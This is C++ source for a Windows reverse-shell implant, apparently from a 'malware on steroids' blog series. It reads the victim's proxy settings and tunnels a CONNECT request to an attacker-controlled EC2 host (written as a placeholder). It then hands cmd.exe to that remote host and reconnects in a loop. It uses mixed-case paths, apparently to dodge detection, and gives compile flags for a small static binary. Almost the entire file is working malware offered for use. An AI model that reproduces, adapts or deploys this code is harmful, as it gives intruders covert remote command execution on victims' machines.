//Author : Paranoid Ninja
//Email  : paranoidninja@protonmail.com
//Blog   : https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/

//Compile with g++/i686-w64-mingw32-g++ prometheus_v2.cpp -o prometheus_v2.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
//The effective size with statically compiled code should be around 20 Kb

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void RunShell() {

    //Fetches Proxy Details
    DWORD dwSize;
    LPINTERNET_PROXY_INFO ProxyInfo;
    char lpszData[100] = "";
    InternetQueryOption (NULL, INTERNET_OPTION_PROXY, lpszData, &dwSize);
    ProxyInfo = (LPINTERNET_PROXY_INFO) lpszData;
    printf("Proxy Connection: %s\n", (ProxyInfo->lpszProxy));

    char LocalProxy[strlen(ProxyInfo->lpszProxy)];
    memset(LocalProxy, 0, sizeof(LocalProxy));
    char LocalProxyPortString[6];
    int LocalProxyPort;

    for (int i=0; i<strlen(ProxyInfo->lpszProxy); i++) {
        if ((ProxyInfo->lpszProxy)[i] == *":") {
            i++;
            for (int j = 0; i<strlen(ProxyInfo->lpszProxy); i++) {
                LocalProxyPortString[j] = (ProxyInfo->lpszProxy)[i];
                j++;
            }
            break;
        }
        else {
            LocalProxy[i] = (ProxyInfo->lpszProxy)[i];
        }
    }
    LocalProxyPort = atoi(LocalProxyPortString);
    printf("Proxy Server: %s\nProxy Port: %d\n", LocalProxy, LocalProxyPort);

    char httpRequest[] = ("CONNECT ec2-x-x-x-x.compute-1.amazonaws.com:443 HTTP/1.1\r\n"
                         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\r\n"
                         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                         "Accept-Language: en-US,en;q=0.5\r\n"
                         "Accept-Encoding: gzip, deflate\r\n"
                         "Upgrade-Insecure-Requests: 0\r\n"
                         "Connection: keep-alive\r\n"
                         "Host: ec2-x-x-x-x.compute-1.amazonaws.com\r\n\r\n");
    
    while(true) {
        Sleep(5000);    // 1000 = One Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(LocalProxy);  //Proxy Server Address
        addr.sin_port = htons(LocalProxyPort);     //Proxy Server Port

        //Connecting to Proxy/ProxyIP/C2Host
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            send(mySocket, httpRequest, (strlen(httpRequest)+1), 0);
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "c:\\WiNdOWs\\SyStEm32\\cMd.exE";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}
//-----------------------------------------------------------
//-----------------------------------------------------------
//-----------------------------------------------------------
int main() {
    RunShell();
    return 0;
}
